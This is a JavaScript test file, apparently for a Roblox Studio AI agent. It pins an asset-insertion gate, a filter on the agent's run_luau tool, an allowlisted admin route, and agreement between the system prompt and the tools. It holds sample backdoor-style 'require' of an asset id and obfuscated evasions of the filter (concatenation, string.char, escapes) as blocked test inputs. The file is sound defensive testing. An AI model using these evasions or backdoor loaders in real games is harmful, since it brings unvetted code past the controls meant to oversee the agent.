  // The discard itself also failed, so the tool says so instead of claiming the place is clean.
  assert.deepEqual(out.result.manualCleanupRequired, ['game.Workspace.Crate']);
});

test('a script that survives removal is a refusal — the re-list is trusted over our own bookkeeping', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }] });
  // A Studio that reports success on the delete and quietly keeps the script.
  const realOp = studio.bridge.execStudioOp;
  studio.bridge.execStudioOp = async (op, ms) => (op.op === 'delete_instances' && !op.paths.includes('game.Workspace.Crate') ? { ok: true, data: {} } : realOp(op, ms));
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /survived removal/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'the whole asset goes when it cannot be proven clean');
});

test('an unenumerable subtree is discarded — a tree that cannot be walked is not an empty one', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({ failOn: 'get_tree' });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('more scripts than the scan cap is refused on count alone, at the tool boundary too', async () => {
  serveDetails(detailsFor(101));
  const many = Array.from({ length: SCAN_LIMITS.maxScripts + 3 }, (_, i) => ({ path: `game.Workspace.Crate.S${i}`, className: 'Script', source: PLAIN_SCRIPT }));
  const studio = fakeStudio({ scripts: many });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /scan cap/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
  assert.equal(studio.state.calls.filter((c) => c === 'read_script').length, 0, 'refused on count before a single source was read');
});

test('the tool result stays small enough to be worth re-sending on every later step', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: Array.from({ length: 6 }, (_, i) => ({ path: `game.Workspace.Crate.S${i}`, className: 'Script', source: HTTP_SCRIPT.replace('https://', 'http://') })),
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.ok(out.resultForLlm.length < 1500, `a tool result of ${out.resultForLlm.length} chars is too much context to re-send`);
});

test('NO NETWORK: every request this section made went to the injected stub, and only to Roblox', () => {
  assert.ok(fetched.length > 5, 'the recorder should have seen the metadata gate work');
  for (const u of fetched) assert.match(u, /^https:\/\/apis\.roblox\.com\//, u);
});

// ==============================================================================================
// 7. run_luau is not an asset-insertion channel
//
// The gate in §6 covers `insert_asset`. It covered nothing else, and `run_luau` hands arbitrary
// Luau to the plugin's `run_code`, which requires it in PLUGIN context — so
// `game:GetObjects("rbxassetid://12345")` reached exactly the same place as `insert_asset`, with no
// verification, no post-insertion scan and no audit row. One line, in a tool both Agent and Super
// Agent hold.
//
// These tests pin BOTH halves of the trade. The refusals are worthless if the tool stops being
// useful, so the allow cases below are real building Luau — loops, Instance.new, materials — and
// they are as load-bearing as the refusals.
// ==============================================================================================

/**
 * A context that RECORDS what reached Studio rather than refusing it.
 *
 * The refusals below are only meaningful if the op queue could have been reached — a ctx that
 * failed every op would pass them vacuously — so the fake succeeds, and each test asserts on the
 * ops it saw.
 */
function recordingCtx() {
  const calls = [];
  return {
    calls,
    ctx: {
      env: {},
      studioConnected: () => true,
      execStudioOp: async (op) => {
        calls.push(op.op);
        return { ok: true, data: { result: { t: 'string', v: 'ok' } } };
      },
      createCheckpoint: async () => ({ error: 'not part of this path' }),
      addMemoryFact: async () => {},
    },
  };
}

const luau = async (code) => {
  const { ctx, calls } = recordingCtx();
  const out = await T.runTool(ctx, 'run_luau', JSON.stringify({ code }));
  return { ...out, result: JSON.parse(out.resultForLlm), calls };
};

/** Every ingress primitive the guard must name: what it is, the snippet, and the code it must report. */
const INGRESS = [
  ['game:GetObjects', 'local objs = game:GetObjects("rbxassetid://12345")\nobjs[1].Parent = workspace', 'get_objects'],
  ['InsertService:LoadAsset', 'local m = game:GetService("InsertService"):LoadAsset(12345)\nm.Parent = workspace', 'insert_service'],
  ['InsertService:LoadAssetVersion', 'local m = game:GetService("InsertService"):LoadAssetVersion(999)\nm.Parent = workspace', 'insert_service'],
  ['an rbxassetid:// literal', 'local p = Instance.new("MeshPart")\np.MeshId = "rbxassetid://12345"\np.Parent = workspace', 'asset_uri'],
  ['an rbxthumb:// literal', 'local d = Instance.new("Decal")\nd.Texture = "rbxthumb://type=Asset&id=12345&w=420&h=420"\nd.Parent = workspace', 'asset_uri'],
  ['Content.fromAssetId', 'local c = Content.fromAssetId(12345)\nlocal p = AssetService:CreateMeshPartAsync(c)', 'content_from_asset'],
  ['require of an asset id', 'local lib = require(3163717554)\nlib.load(game, "owner")', 'require_asset_id'],
  ['loadstring', 'local f = loadstring("return 1")\nreturn f()', 'dynamic_code'],
];

for (const [what, snippet, code] of INGRESS) {
  test(`run_luau REFUSES ${what} — and the refusal happens before anything reaches Studio`, async () => {
    const r = await luau(snippet);
    assert.equal(r.ok, false, snippet);
    assert.ok(r.result.blocked.includes(code), `expected ${code}, got ${JSON.stringify(r.result.blocked)}`);
    assert.match(r.result.error, /insert_asset/, 'a refusal that does not say what to do instead is a dead end');
    assert.deepEqual(r.calls, [], 'the op queue must never see code that was going to insert an asset');
  });
}

test('THE OBVIOUS EVASIONS: concatenation, string.char and escapes all resolve to the same refusal', async () => {
  // Concatenation, with no rbxassetid literal anywhere — the fold has to rebuild the method name.
  const concat = await luau('local f = game["Get" .. "Objects"]\nreturn f');
  assert.equal(concat.ok, false);
  assert.ok(concat.result.blocked.includes('get_objects'));

  // string.char assembly of "rbxassetid://", with no GetObjects to fall back on.
  const chars = 'local p = Instance.new("MeshPart")\np.MeshId = string.char(114,98,120,97,115,115,101,116,105,100,58,47,47) .. "12345"';
  const built = await luau(chars);
  assert.equal(built.ok, false);
  assert.deepEqual(built.result.blocked, ['asset_uri']);

  // A decimal escape inside the literal.
  const escaped = await luau('local p = Instance.new("MeshPart")\np.MeshId = "\\114bxassetid://12345"');
  assert.equal(escaped.ok, false);
  assert.deepEqual(escaped.result.blocked, ['asset_uri']);

  // Splitting the URI across two literals.
  const split = await luau('local p = Instance.new("MeshPart")\np.MeshId = "rbxasset" .. "id://12345"');
  assert.equal(split.ok, false);
  assert.deepEqual(split.result.blocked, ['asset_uri']);

  for (const r of [concat, built, escaped, split]) assert.deepEqual(r.calls, []);
});

test('a computed member on `game` is refused, because that is the evasion the fold cannot follow', async () => {
  // `game[k]` where k is decided at runtime is unreadable by any source filter, so it is refused
  // rather than pretended about. This is the rule the honesty comment in tools.ts is about.
  const r = await luau('local k = fetchName()\nlocal f = game[k]\nreturn f(game, 12345)');
  assert.equal(r.ok, false);
  assert.ok(r.result.blocked.includes('computed_member'));
  assert.deepEqual(r.calls, []);
});

test('a string that looks like a comment cannot hide the next statement', async () => {
  // The naive "strip from -- to end of line" would have eaten the GetObjects call with the string.
  const r = await luau('local dash = "--" local objs = game:GetObjects("rbxassetid://1")');
  assert.equal(r.ok, false);
  assert.ok(r.result.blocked.includes('get_objects'));
});

test('a require by PATH is allowed; a require of anything unreadable is not', async () => {
  // Both shapes real Luau uses: a full path, and a service captured into a local further up.
  for (const ok of [
    'local U = require(game.ServerScriptService.Utils)\nreturn U.version',
    'local SS = game:GetService("ServerStorage")\nlocal Cfg = require(SS.Modules.Config)\nreturn Cfg.seed',
  ]) {
    const r = await luau(ok);
    assert.equal(r.ok, true, r.resultForLlm);
  }

  // The backdoor with its id assembled out of two numbers, which is the fixture §1 scans.
  const computed = await luau('local id = 316 .. 3717554\nrequire(tonumber(id))');
  assert.equal(computed.ok, false);
  assert.ok(computed.result.blocked.some((b) => b.startsWith('require_')));
  assert.deepEqual(computed.calls, []);
});

// The other half of the trade: the tool still has to be worth having.
const ORDINARY_LUAU = {
  'a ring of parts': `local M = Instance.new("Model")
M.Name = "Colonnade"
for i = 1, 12 do
	local p = Instance.new("Part")
	p.Size = Vector3.new(1.4, 18, 1.4)
	p.Position = Vector3.new(math.cos(i) * 30, 9, math.sin(i) * 30)
	p.Material = Enum.Material.Marble
	p.Color = Color3.fromRGB(210, 205, 190)
	p.Anchored = true
	p.Parent = M
end
M.Parent = workspace
return #M:GetChildren()`,
  'terrain and lighting': `local T = workspace.Terrain
T:FillBlock(CFrame.new(0, -2, 0), Vector3.new(512, 4, 512), Enum.Material.Grass)
local L = game:GetService("Lighting")
L.Brightness = 2.5
L.ClockTime = 15
return "filled"`,
  'a comment that names the primitive': `-- do NOT use game:GetObjects here; insert_asset owns that
-- rbxassetid:// links belong in the asset library, not in a build script
local p = Instance.new("Part")
p.Anchored = true
p.Parent = workspace
return p.Name`,
  'measurement': `local n = 0
for _, d in workspace:GetDescendants() do
	if d:IsA("BasePart") and d.Material == Enum.Material.Plastic then n += 1 end
end
return n`,
  'a module required by path': 'local Cfg = require(script.Parent.Config)\nreturn Cfg.seed',
};

for (const [what, code] of Object.entries(ORDINARY_LUAU)) {
  test(`run_luau STILL RUNS ordinary building Luau: ${what}`, async () => {
    const r = await luau(code);
    assert.equal(r.ok, true, r.resultForLlm);
    assert.deepEqual(r.calls, ['run_code'], 'this is the case the escape hatch exists for');
  });
}

test('non-vacuity: the allowed snippet becomes a refusal the moment one ingress line is added to it', async () => {
  const clean = ORDINARY_LUAU['a ring of parts'];
  assert.equal((await luau(clean)).ok, true);
  const dirty = clean + '\nlocal extra = game:GetObjects("rbxassetid://12345")';
  const r = await luau(dirty);
  assert.equal(r.ok, false);
  assert.deepEqual(r.calls, [], 'the whole snippet is refused — a partial run would already have inserted');
});

test('the findings are deduplicated and every one carries a reason — this is the audit record', () => {
  // Two GetObjects calls and two rbxassetid literals in one snippet are two findings, not four, and
  // a code with no sentence attached would tell a later reader nothing about what was refused.
  const findings = T.scanLuauForAssetIngress(
    'local a = game:GetObjects("rbxassetid://1")\nlocal b = game:GetObjects("rbxassetid://2")',
  );
  assert.deepEqual(findings.map((f) => f.code).sort(), ['asset_uri', 'get_objects']);
  for (const f of findings) assert.ok(f.why.length > 20, JSON.stringify(f));
  assert.deepEqual(T.scanLuauForAssetIngress('return 1'), []);
});

test("run_luau's own description tells the model the rule, so a refusal is never a surprise", () => {
  const d = T.TOOLS.run_luau.def.description;
  for (const token of ['GetObjects', 'InsertService', 'rbxassetid://', 'insert_asset']) {
    assert.ok(d.includes(token), `the description must name ${token}`);
  }
});

// ==============================================================================================
// 8. Provenance — the code and the description now say the same thing
//
// The description used to promise: "The id MUST have come from search_asset_library or
// find_verified_asset in this conversation — an id from anywhere else is refused." It was not.
// `provenance` is computed as library | search_result | user_supplied, and only `model_output` and
// `unknown` are refused — and nothing assigns `model_output`, so the refusal could not fire.
//
// The gap is not fixable HERE: an id the user pasted and an id the model invented arrive at the
// tool as the same integer, and the user's message text lives in the session Durable Object. So
// the description was changed to state what actually happens, and these tests pin the two together:
// an undiscovered id is the least-trusted provenance, it is verified in full, and the result SAYS
// which provenance it ran under so the transcript records it.
// ==============================================================================================

test('AN UNDISCOVERED ID IS NOT REFUSED — it is verified in full and reported as user_supplied', async () => {
  serveDetails(detailsFor(4242));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio), 4242); // nothing in discoveredAssetIds

  assert.equal(out.ok, true, out.resultForLlm);
  assert.equal(out.result.provenance, 'user_supplied', 'the weakest provenance is recorded, not hidden');
  assert.ok(fetched.some((u) => u.includes('assetIds=4242')), 'it was resolved against the Creator Store like any other id');
  for (const required of ['insert_asset', 'get_tree', 'list_scripts']) {
    assert.ok(studio.state.calls.includes(required), `${required} must run for an id nobody searched for`);
  }
});

test('provenance is reported for every source, so the audit trail never has to infer it', async () => {
  serveDetails(detailsFor(4243));
  const searched = await insert(toolCtx(fakeStudio(), { discovered: [4243] }), 4243);
  assert.equal(searched.result.provenance, 'search_result');

  serveDetails(detailsFor(4244));
  const lib = await insert(toolCtx(fakeStudio(), { discovered: [4244], library: [4244] }), 4244);
  assert.equal(lib.result.provenance, 'library');
});

test('THE DESCRIPTION MATCHES THE CODE: it no longer promises a refusal that never fires', () => {
  const d = T.TOOLS.insert_asset.def.description;
  assert.equal(/anywhere else is refused/.test(d), false, 'that promise was false — the refusal branch is unreachable');
  assert.match(d, /EVERY id is resolved/, 'what it does do is verify every id, whatever its source');
  assert.match(d, /never one you produced yourself/, 'the model still has to be told not to invent ids');
});

test('an undiscovered id gets NO waiver — the library exemption is by provenance, not by pleading', async () => {
  // The same unrated, unfree, unverified-creator asset that the library may waive in §6.
  serveDetails(
    detailsFor(4245, {
      creator: { id: 91, name: 'Someone', isVerifiedCreator: false },
      voting: { upVotePercent: 0, voteCount: 0 },
      fiatProduct: { isFree: false },
    }),
  );
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio), 4245);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /was not verified/);
  assert.equal(studio.state.calls.length, 0);
});

// ==============================================================================================
// 9. The admin diagnostics route
//
// `/api/admin/studio-op/:id` forwarded whatever JSON it was handed straight to the session DO, so
// an admin key was enough to post `{op:'insert_asset'}` and put an arbitrary asset id into a paired
// place — past the metadata gate, past the post-insertion scan, past the audit row. The route is
// worth keeping (the smoke test, store-validation.mjs and visual-bench.mjs all drive a plugin
// through it with no agent loop), so it is allowlisted rather than removed, and its `run_code`
// carries the same filter §7 pins.
//
// The worker is imported and driven as a real Hono app with a fake SESSION_DO, so these tests
// exercise the actual route, not a copy of its rules.
// ==============================================================================================

const workerOut = join(dir, 'worker.mjs');
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [
  join(WORKER, 'src', 'index.ts'),
  '--bundle',
  '--format=esm',
  '--target=es2022',
  // Provided by the Workers runtime. The DO base class is stubbed below; nothing in this section
  // instantiates a Durable Object, it only needs the module to import.
  '--external:cloudflare:workers',
  '--outfile=' + workerOut,
], { stdio: 'pipe', cwd: WORKER });
{
  const src = readFileSync(workerOut, 'utf8');
  const bound = [];
  const stripped = src.replace(/import\s*\{([^}]*)\}\s*from\s*["']cloudflare:workers["'];?/g, (_m, names) => {
    for (const n of names.split(',')) {
      const local = n.trim().split(/\s+as\s+/).pop();
      if (local) bound.push(local);
    }
    return '';
  });
  writeFileSync(workerOut, `class __DurableObjectStub { constructor(ctx, env) { this.ctx = ctx; this.env = env; } }\n${bound.map((n) => `const ${n} = __DurableObjectStub;`).join('\n')}\n${stripped}`);
}
const worker = (await import(workerOut)).default;

/** A session DO that records what the route forwarded, so "refused" and "forwarded" are separable. */
function adminEnv() {
  const forwarded = [];
  return {
    forwarded,
    env: {
      ADMIN_KEY: 'test-admin-key',
      SESSION_DO: {
        idFromName: (n) => n,
        get: () => ({
          fetch: async (_url, init) => {
            forwarded.push(JSON.parse(init.body));
            return new Response(JSON.stringify({ ok: true, data: { forwarded: true } }), { headers: { 'content-type': 'application/json' } });
          },
        }),
      },
    },
  };
}

const adminOp = async (op, key = 'test-admin-key') => {
  const { env, forwarded } = adminEnv();
  const res = await worker.fetch(
    new Request('https://golem.test/api/admin/studio-op/9f1c1f2a-0000-4000-8000-000000000001', {
      method: 'POST',
      headers: { 'X-Admin-Key': key, 'Content-Type': 'application/json' },
      body: JSON.stringify({ op, timeoutMs: 5000 }),
    }),
    env,
  );
  return { status: res.status, body: await res.json(), forwarded };
};

test('THE ADMIN ROUTE REFUSES A GATED OP: an admin key is not a way past the asset gate', async () => {
  const r = await adminOp({ op: 'insert_asset', assetId: 12345, parent: 'game.Workspace' });
  assert.equal(r.status, 400);
  assert.match(r.body.error, /not a diagnostics op/);
  assert.match(r.body.error, /run-tool/, 'the refusal must name the route that does gate it');
  assert.deepEqual(r.forwarded, [], 'nothing may reach the Durable Object');
});

test('the admin route cannot grant itself verified asset ids', async () => {
  /* The plugin honours `op.verifiedAssetIds` as proof an id already passed the
     gate (apps/plugin/src/Ops.luau, assetPolicyFor). This route forwards untyped
     JSON, so without stripping it an admin key stops being a key to the
     diagnostics surface and becomes a way AROUND the asset gate: `set_props`
     with a MeshId would then be allowed to reference any id the caller named.

     The first attempt at this fix rebuilt the outer envelope and left the field
     untouched inside `op`, which closed nothing — hence the assertion is on
     `forwarded[0].op`, not on the envelope. */
  const r = await adminOp({
    op: 'set_props',
    path: 'game.Workspace.Part',
    props: { MeshId: { t: 'Content', v: 'rbxassetid://12345' } },
    verifiedAssetIds: [12345],
  });
  assert.equal(r.status, 200, 'set_props is a legitimate diagnostics op and must still be forwarded');
  assert.equal(r.forwarded.length, 1);
  assert.equal(
    'verifiedAssetIds' in r.forwarded[0].op,
    false,
    'verifiedAssetIds must not survive the admin route — the plugin would read it as proof of verification',
  );
  // Non-vacuity: the rest of the op has to arrive intact, or the assertion above
  // would pass simply because nothing was forwarded.
  assert.equal(r.forwarded[0].op.op, 'set_props');
  assert.equal(r.forwarded[0].op.path, 'game.Workspace.Part');
});

test('generate_model is refused here too — it is the other op that brings content in from outside', async () => {
  const r = await adminOp({ op: 'generate_model', prompt: 'a tree', parent: 'game.Workspace' });
  assert.equal(r.status, 400);
  assert.deepEqual(r.forwarded, []);
});

test('an op the route never heard of is refused rather than forwarded hopefully', async () => {
  const r = await adminOp({ op: 'exfiltrate' });
  assert.equal(r.status, 400);
  assert.deepEqual(r.forwarded, []);
  const empty = await adminOp({});
  assert.equal(empty.status, 400);
  assert.deepEqual(empty.forwarded, []);
});

test('run_code through the admin route carries the SAME filter as run_luau', async () => {
  const blocked = await adminOp({ op: 'run_code', code: 'game:GetObjects("rbxassetid://12345")' });
  assert.equal(blocked.status, 400);
  assert.ok(blocked.body.blocked.includes('get_objects'), JSON.stringify(blocked.body));
  assert.deepEqual(blocked.forwarded, []);
});

test('the harnesses still work: every op infra/ and packages/evals actually send is forwarded', async () => {
  // ping/get_tree/list_scripts/viewport_info/create_instances/run_code from infra/store-validation.mjs
  // and infra/smoke.mjs; render_view and run_code from packages/evals/src/visual-bench.mjs. If this
  // list has to shrink, a harness broke; if it has to grow, someone widened the route on purpose.
  const ops = [
    { op: 'ping' },
    { op: 'get_tree', maxDepth: 3, maxNodes: 400 },
    { op: 'list_scripts' },
    { op: 'viewport_info' },
    { op: 'render_view', view: 'all' },
    { op: 'create_instances', items: [{ className: 'Part', name: 'A', parent: 'game.Workspace' }] },
    { op: 'delete_instances', paths: ['game.Workspace.A'] },
    { op: 'run_code', code: 'local f = workspace:FindFirstChild("X") if f then f:Destroy() end return "CLEANED"' },
  ];
  for (const op of ops) {
    const r = await adminOp(op);
    assert.equal(r.status, 200, `${op.op} must still reach the plugin: ${JSON.stringify(r.body)}`);
    assert.equal(r.forwarded.length, 1, op.op);
  }
});

test('the admin key is still the gate: a wrong key never reaches the allowlist at all', async () => {
  const r = await adminOp({ op: 'ping' }, 'wrong');
  assert.equal(r.status, 403);
  assert.deepEqual(r.forwarded, []);
});

// ==============================================================================================
// 10. The system prompt and the tools agree
//
// The prompt said "There is no asset search; a made-up id fails or inserts something random" while
// two asset-search tools existed and insert_asset's own description said the opposite. Two
// contradictory instructions about one tool, in one context window, is a bug in the prompt.
// ==============================================================================================

const promptsOut = join(dir, 'prompts.mjs');
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'prompts.ts'), '--bundle', '--format=esm', '--target=es2022', '--outfile=' + promptsOut], { stdio: 'pipe', cwd: WORKER });
const P = await import(promptsOut);

test('THE SYSTEM PROMPT NO LONGER CONTRADICTS THE TOOLS it is describing', () => {
  // The invariant is agreement between the prompt and the tool list, in BOTH deployment states —
  // not that a particular tool is always named. `search_asset_library` is now withheld where the
  // curated library's tables were never created, and naming a tool the model cannot see would be
  // the same contradiction this test was written to catch, pointing the other way.
  const base = { mode: 'stone', studioConnected: true, placeName: 'Test', projectName: 'Test', memorySummary: null, memoryFacts: [], fenceId: 'ev4lf3nc' };

  for (const assetLibraryAvailable of [true, false]) {
    const sys = P.systemPrompt({ ...base, assetLibraryAvailable });
    const offered = T.toolDefs(true, undefined, { assetLibrary: assetLibraryAvailable }).map((d) => d.name);

    assert.equal(
      sys.includes('search_asset_library'),
      offered.includes('search_asset_library'),
      `library=${assetLibraryAvailable}: the prompt and the tool list must agree`,
    );
    // The Creator Store route exists in both states and must be named in both.
    assert.match(sys, /find_verified_asset/);
    assert.ok(offered.includes('find_verified_asset'));
    assert.match(sys, /run_luau refuses/, 'the prompt must state the run_luau rule the tool enforces');
    assert.equal(/There is no asset search/.test(sys), false, 'stale: an asset search does exist');
    // And it must not re-introduce the old rule that only a user-given id may be inserted, which
    // would send the model looking for permission it does not need for a searched id.
    assert.equal(/Only call insert_asset with an id the USER gave you/.test(sys), false);
    // The template token must never survive into a real prompt.
    assert.equal(sys.includes('{{ASSET_SOURCES}}'), false, 'unsubstituted template token in the system prompt');
  }
});
